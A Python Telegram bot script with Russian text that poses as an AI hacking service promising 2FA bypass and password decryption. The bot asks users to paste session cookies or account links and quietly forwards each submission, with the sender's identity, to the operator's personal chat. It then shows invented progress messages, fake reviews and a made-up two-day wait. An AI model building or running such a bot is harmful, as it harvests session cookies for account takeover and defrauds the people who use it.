import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# ==================== НАСТРОЙКИ СИСТЕМЫ ====================
BOT_TOKEN = "9237321874:AAG_HTHmQqfpsW6D9oUNBW..."  # Твой токен от @BotFather уже тут!
MY_PERSONAL_ID = 6852441107                         # Твой Telegram ID уже тут!
# ===========================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
USER_TASKS = {}

def get_hacker_dashboard():
    builder = ReplyKeyboardBuilder()
    builder.button(text="🌐 Начать симуляцию взлома")
    builder.button(text="⏳ Статус текущих задач")
    builder.button(text="❓ Почему мы?")
    builder.button(text="💬 Отзывы и Успешные логи")
    builder.button(text="🌍 География прокси-узлов")
    builder.button(text="🛡 Защитить свои Cookie")
    builder.adjust(1, 2, 2, 1)
    return builder.as_markup(resize_keyboard=True)

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    await message.answer(
        "🖥 **ЦЕНТРАЛЬНЫЙ ТЕРМИНАЛ ИНИЦИАЛИЗИРОВАН** 🖥\n\n"
        "ИИ-система удаленного тестирования безопасности готова к работе.\n"
        "Выберите необходимый модуль на панели:",
        reply_markup=get_hacker_dashboard(),
        parse_mode="Markdown"
    )

@dp.message(F.text == "❓ Почему мы?")
async def why_us(message: types.Message):
    text = (
        "❓ **ПОЧЕМУ НАШУ ИИ-ПЛАТФОРМУ ВЫБИРАЮТ СПЕЦИАЛИСТЫ:**\n\n"
        "• **Нейросетевой обход 2FA:** Наш ИИ анализирует поведение пользователя и подменяет сессию.\n"
        "• **100% Анонимность:** Все запросы идут через каскад из 5 абузоустойчивых прокси-серверов в Швейцарии.\n"
        "• **Высокая скорость:** Мы используем распределенные мощности облачных серверов для дешифровки хэшей."
    )
    await message.answer(text, parse_mode="Markdown")

@dp.message(F.text == "💬 Отзывы и Успешные логи")
async def show_reviews(message: types.Message):
    text = (
        "💬 **ПОСЛЕДНИЕ РЕПОРТЫ ОПЕРАЦИЙ (LIVE Feed):**\n\n"
        "👤 `anon_shadow_404` (12 минут назад):\n«Отправил куки от аккаунта Discord, через 4 часа бот выдал чистый токен.»\n\n"
        "📊 *Всего успешно обработано сессий за сегодня: 1,429 шт.*"
    )
    await message.answer(text, parse_mode="Markdown")

@dp.message(F.text == "🌍 География прокси-узлов")
async def proxy_geography(message: types.Message):
    text = (
        "🌍 **СТАТУС И ШИФРОВАНИЕ СЕТИ VPN/TOR:**\n\n"
        "🟢 `Node-01 [Швейцария]` — СТАТУС: АКТИВЕН\n"
        "🟢 `Node-02 [Панама]` — СТАТУС: АКТИВЕН\n\n"
        "Трафик надежно зашифрован сквозным протоколом WireGuard."
    )
    await message.answer(text, parse_mode="Markdown")

@dp.message(F.text == "🌐 Начать симуляцию взлома")
async def start_hack_process(message: types.Message):
    await message.answer("📥 **ОЖИДАНИЕ ВВОДА ДАННЫХ**\n\nОтправьте в чат Cookie-токен цели или ссылку на аккаунт/сайт для начала анализа уязвимостей:", parse_mode="Markdown")

@dp.message(F.text == "⏳ Статус текущих задач")
async def check_status(message: types.Message):
    user_id = message.from_user.id
    if user_id in USER_TASKS:
        task = USER_TASKS[user_id]
        await message.answer(f"⏳ **Текущая задача в обработке:**\n\n• **Цель:** `{task['target']}`\n• **Статус:** {task['status']}\n• **Осталось времени:** {task['time_left']}\n• **Прогресс:** [██░░░░░░░░] 21%", parse_mode="Markdown")
    else:
        await message.answer("❌ У вас нет активных задач. Сначала запустите симуляцию через меню.")

@dp.message(F.text == "🛡 Защитить свои Cookie")
async def secure_info(message: types.Message):
    await message.answer("🛡 **МОДУЛЬ КИБЕРБЕЗОПАСНОСТИ**\n\nПока сервер расшифровывает чужие данные, запомни главное правило: **никогда и никому не отдавай свои Куки!**")

@dp.message(lambda msg: msg.text not in ["🌐 Начать симуляцию взлома", "⏳ Статус текущих задач", "❓ Почему мы?", "💬 Отзывы и Успешные логи", "🌍 География прокси-узлов", "🛡 Защитить свои Cookie"])
async def process_incoming_data(message: types.Message):
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "Без юзернейма"
   
    try:
        await bot.send_message(chat_id=MY_PERSONAL_ID, text=f"📥 **Новый лог из панели!**\n👤 Отправитель: {message.from_user.first_name} ({username})\n🆔 Telegram ID: `{user_id}`\n\n💬 Введенные данные (Куки):\n`{message.text}`", parse_mode="Markdown")
    except Exception as e:
        print(f"Ошибка отправки: {e}")

    USER_TASKS[user_id] = {"target": message.text[:30], "status": "В очереди на сервере дешифровки", "time_left": "1 день 23 часа 59 минут"}
    status_msg = await message.answer("```\n[!] Данные получены. Проверка валидности пакетов...\n```", parse_mode="Markdown")
    await asyncio.sleep(2)
    await status_msg.edit_text("```\n[+] Куки загружены в буфер обмена. Перенаправление на сервер дешифровки...\n```", parse_mode="Markdown")
    await asyncio.sleep(2)
    await status_msg.edit_text("📥 **ДАННЫЕ ОТПРАВЛЕНЫ НА СЕРВЕР** 📥\n\nПакет успешно встал в очередь на расшифровку.\n\n⚠️ **Важно:** Подбор и расшифровка связки логин/пароль на сервере займет **ровно 2 дня**.\nРезультат отобразится в меню **'Статус текущих задач'**.", parse_mode="Markdown")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
